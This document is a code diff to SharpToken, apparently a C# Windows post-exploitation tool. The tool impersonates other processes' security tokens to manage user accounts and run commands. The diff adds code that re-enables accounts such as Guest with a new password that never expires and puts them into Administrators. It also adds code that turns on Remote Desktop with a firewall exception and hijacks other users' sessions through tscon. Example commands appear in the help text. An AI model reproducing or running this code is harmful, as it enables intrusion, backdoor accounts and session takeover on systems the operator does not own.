@@ -3,7 +3,9 @@ using System.Collections;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.DirectoryServices;
+using System.DirectoryServices.ActiveDirectory;
 using System.IO;
+using System.Management;
 using System.Reflection;
 using System.Runtime.ConstrainedExecution;
 using System.Runtime.InteropServices;
@@ -11,6 +13,7 @@ using System.Security.Permissions;
 using System.Security.Principal;
 using System.Text;
 using System.Threading;
+using static System.Management.ManagementObjectCollection;
 
 namespace SharpToken
 {
@@ -449,6 +452,12 @@ namespace SharpToken
         public static extern bool GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);
         [DllImport("Kernel32", SetLastError = true)]
         public static extern bool SetHandleInformation(IntPtr TokenHandle, uint dwMask, uint dwFlags);
+
+        [DllImport("wtsapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public static extern int WTSConnectSession(int targetSessionId, int sourceSessionId, string password, bool wait);
+
+        [DllImport("kernel32.dll")]
+        public static extern int WTSGetActiveConsoleSessionId();
 
         [DllImport("kernel32.dll", SetLastError = true)]
         public static extern IntPtr OpenProcess(
@@ -1393,6 +1402,8 @@ namespace SharpToken
                                 Console.Write(Encoding.Default.GetChars(readBytes,0,read));
                             }
 
+                            Thread.Sleep(100);
+
                         }
 
 
@@ -1577,8 +1588,7 @@ namespace SharpToken
             }
         }
 
-        public static void addUser(TextWriter consoleWriter,string domain, string userName, string passWord,string group)
-        {
+        public static void addUser(TextWriter consoleWriter, string domain, string userName, string passWord, string group) {
             bool isOK = false;
             TokenuUils.ListProcessTokens(0, processToken =>
             {
@@ -1635,9 +1645,79 @@ namespace SharpToken
                 consoleWriter.WriteLine("add user Fail!");
             }
         }
+        public static void enableUser(TextWriter consoleWriter,string domain, string userName, string passWord,string group)
+        {
+            bool isOK = false;
+            TokenuUils.ListProcessTokens(0, processToken =>
+            {
+                if (processToken.UserName != "NT AUTHORITY\\ANONYMOUS LOGON" && processToken.ImpersonateLoggedOnUser())
+                {
+                    try
+                    {
+                        using (DirectoryEntry dir = new DirectoryEntry(domain))
+                        {
+                            using (DirectoryEntry user = dir.Children.Find(userName, "User")) //查找用户名
+                            {
+                                user.Invoke("SetPassword", passWord); //用户密码
+                                user.InvokeSet("UserFlags", 66049); //密码永不过期
+                                user.InvokeSet( "AccountDisabled", false); //启用账户
+                                user.CommitChanges();//保存用户
+
+                                if (group!=null && group.Length > 0)
+                                {
+                                    using (DirectoryEntry grp = dir.Children.Find(group, "group"))
+                                    {
+                                        bool isExist = false;
+                                        object members = grp.Invoke("Members", null);
+                                        foreach (object member in (IEnumerable)members)
+                                        {
+                                            DirectoryEntry x = new DirectoryEntry(member);
+                                            if (x.Name == userName)
+                                            {
+                                                isExist = true;
+                                                break;
+                                            }
+                                        }
+                                        if (grp.Name != "" && !isExist)
+                                        {
+                                            grp.Invoke("Add", user.Path.ToString());//将用户添加到某组
+                                        }
+                                        grp.CommitChanges();
+                                    }
+                                }
+                            }
+                        }
+                    }
+                    catch (Exception e)
+                    {
+                        NativeMethod.RevertToSelf();
+                        processToken.Close();
+                        return true;
+                    }
+                }
+                else
+                {
+                    processToken.Close();
+                    return true;
+                }
+                isOK = true;
+                NativeMethod.RevertToSelf();
+                processToken.Close();
+                return false;
+            });
+
+            if (isOK)
+            {
+                consoleWriter.WriteLine("enable user Successful!");
+            }
+            else
+            {
+                consoleWriter.WriteLine("enable user Fail!");
+            }
+        }
         public static void deleteUser(TextWriter consoleWriter, string domain,string userName)
         {
-                        bool isOK = false;
+            bool isOK = false;
             TokenuUils.ListProcessTokens(0, processToken =>
             {
                 if (processToken.UserName != "NT AUTHORITY\\ANONYMOUS LOGON" && processToken.ImpersonateLoggedOnUser())
@@ -1679,8 +1759,137 @@ namespace SharpToken
                 consoleWriter.WriteLine("delete user Fail!");
             }
         }
+        public static void enableRDP(TextWriter consoleWriter) {
+
+            bool isOK = false;
+            int rdpPort = 3389;
+            TokenuUils.ListProcessTokens(0, processToken =>
+            {
+                if (processToken.UserName != "NT AUTHORITY\\ANONYMOUS LOGON" && processToken.ImpersonateLoggedOnUser())
+                {
+                    try
+                    {
+                        ManagementObject win32TerminalServiceSetting = null;
+                        string root = "root\\cimv2\\terminalservices";
+                        if (Environment.OSVersion.Version.Major < 6)
+                        {
+                            root = "root\\cimv2";
+                        }
+                        ManagementClass mc = new ManagementClass(root, "Win32_TerminalServiceSetting", null);
+                        mc.Scope.Options.EnablePrivileges = true;
+                        ManagementObjectEnumerator managementObjectEnumerator = mc.GetInstances().GetEnumerator();
+                        managementObjectEnumerator.MoveNext();
+                        win32TerminalServiceSetting = (ManagementObject)managementObjectEnumerator.Current;
+
+                        System.Management.ManagementBaseObject inParams = null;
+                        inParams = win32TerminalServiceSetting.GetMethodParameters("SetAllowTSConnections");
+                        inParams["AllowTSConnections"] = ((System.UInt32)(1));
+                        inParams["ModifyFirewallException"] = ((System.UInt32)(1));
+                        System.Management.ManagementBaseObject outParams = win32TerminalServiceSetting.InvokeMethod("SetAllowTSConnections", inParams, null);
+                        uint returnValue = System.Convert.ToUInt32(outParams.Properties["ReturnValue"].Value);
+                        if (returnValue == 0)
+                        {
+                            try
+                            {
+                                using (Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp", false))
+                                {
+                                    if (key != null)
+                                    {
+                                        rdpPort = (int)key.GetValue("PortNumber", 3389);
+                                    }
+                                }
+                            }
+                            catch (Exception e)
+                            {
+                                consoleWriter.WriteLine(e.ToString());
+                            }
+                        }
+                        else
+                        {
+                            throw new Exception("enableRDP return: " + returnValue);
+                        }
+                    }
+                    catch (Exception e)
+                    {
+                        NativeMethod.RevertToSelf();
+                        processToken.Close();
+                        return true;
+                    }
+                }
+                else
+                {
+                    processToken.Close();
+                    return true;
+                }
+                isOK = true;
+                NativeMethod.RevertToSelf();
+                processToken.Close();
+                return false;
+            });
+
+            if (isOK)
+            {
+                consoleWriter.WriteLine($"enableRDP Successful RDPPort:{rdpPort}!");
+            }
+            else
+            {
+                consoleWriter.WriteLine("enableRDP Fail!");
+            }
+        }
+        public static void tscon(TextWriter consoleWriter, int targetSessionId, int sourceSessionId) {
+            if (sourceSessionId == -1)
+            {
+                sourceSessionId = NativeMethod.WTSGetActiveConsoleSessionId();
+            }
+            if (sourceSessionId < 0)
+            {
+                consoleWriter.WriteLine("Please enter sourceSessionId\nSharpToken tscon 2 1");
+            }
+            else
+            {
+                bool isOK = false;
+                TokenuUils.ListProcessTokens(0, processToken =>
+                {
+                    if (processToken.UserName != "NT AUTHORITY\\ANONYMOUS LOGON" && processToken.ImpersonateLoggedOnUser())
+                    {
+                        try
+                        {
+                            if (NativeMethod.WTSConnectSession(targetSessionId, sourceSessionId, "", true) == 0)
+                            {
+                                throw new Exception("" + Marshal.GetLastWin32Error());
+                            }
+                        }
+                        catch (Exception e)
+                        {
+                            NativeMethod.RevertToSelf();
+                            processToken.Close();
+                            return true;
+                        }
+                    }
+                    else
+                    {
+                        processToken.Close();
+                        return true;
+                    }
+                    isOK = true;
+                    NativeMethod.RevertToSelf();
+                    processToken.Close();
+                    return false;
+                });
+
+                if (isOK)
+                {
+                    consoleWriter.WriteLine("Success!");
+                }
+                else
+                {
+                    consoleWriter.WriteLine($"Failed to connect to session: {targetSessionId} error: {Marshal.GetLastWin32Error()}");
+                }
+            }
 
 
+
+        }
         public static void help(TextWriter consoleWriter)
         {
             consoleWriter.WriteLine(@"
@@ -1700,20 +1909,28 @@ COMMANDS:
 
 	list_all_token [process pid]
 
-	add_user <tokenUser> <username> <password> [group] [domain]
+	add_user    <username> <password> [group] [domain]
 
-	delete_user <tokenUser> <username> [domain]
+	enableUser <username> <NewPassword> [NewGroup]
+
+	delete_user <username> [domain]
     
-    execute <tokenUser> <commandLine> [Interactive]
+	execute <tokenUser> <commandLine> [Interactive]
+
+	enableRDP
+
+	tscon <targetSessionId> [sourceSessionId]
 
 
 example:
     SharpToken list_token
     SharpToken list_token 6543
-    SharpToken add_user ""NT AUTHORITY\SYSTEM"" admin 123456 Administrators
-    SharpToken delete_user ""NT AUTHORITY\SYSTEM"" admin
+    SharpToken add_user admin Abcd1234! Administrators
+    SharpToken enableUser Guest Abcd1234! Administrators
+    SharpToken delete_user admin
     SharpToken execute ""NT AUTHORITY\SYSTEM"" ""cmd /c whoami""
     SharpToken execute ""NT AUTHORITY\SYSTEM"" cmd true
+    SharpToken tscon 1
 ");
         }
 
@@ -1758,38 +1975,70 @@ example:
                         listAllToken(Console.Out, processPid);
                         break;
                     case "add_user":
-                        if (args.Length < 4)
-                        {
-                            goto help;
-                        }
-                        else
-                        {
-                            string tokenUser = args[1];
-                            string userName = args[2];
-                            string password = args[3];
-                            if (args.Length > 4)
-                            {
-                                group = args[4];
-                                if (args.Length > 5)
-                                {
-                                    domain = args[5];
-                                }
-                            }
-                            addUser(Console.Out,domain,userName,password,group);
-                            break;
-                        }
-                    case "delete_user":
                         if (args.Length < 3)
                         {
                             goto help;
                         }
                         else
                         {
-                            string tokenUser = args[1];
-                            string userName = args[2];
+                            string userName = args[1];
+                            string password = args[2];
                             if (args.Length > 3)
                             {
-                                domain = args[4];
+                                group = args[3];
+                                if (args.Length > 4)
+                                {
+                                    domain = args[4];
+                                }
+                            }
+                            addUser(Console.Out,domain,userName,password,group);
+                            break;
+                        }
+                    case "enableUser":
+                        if (args.Length < 3)
+                        {
+                            goto help;
+                        }
+                        else
+                        {
+                            string userName = args[1];
+                            string password = args[2];
+                            if (args.Length > 3)
+                            {
+                                group = args[3];
+                                if (args.Length > 4)
+                                {
+                                    domain = args[4];
+                                }
+                            }
+                            enableUser(Console.Out, domain, userName, password, group);
+                            break;
+                        }
+                    case "enableRDP":
+                        enableRDP(Console.Out);
+                        break;
+                    case "tscon":
+                        if (args.Length > 1)
+                        {
+                            int targetSessionId = int.Parse(args[1]); int sourceSessionId = int.Parse(args.Length > 2 ? args[2] :"-1");
+                            tscon(Console.Out,targetSessionId,sourceSessionId);
+                        }
+                        else
+                        {
+                            goto help;
+                        }
+                        break;
+                    case "delete_user":
+                        if (args.Length < 2)
+                        {
+                            goto help;
+                        }
+                        else
+                        {
+                            string userName = args[1];
+                            if (args.Length > 2)
+                            {
+                                domain = args[2];
                             }
                             deleteUser(Console.Out,domain,userName);
                             break;
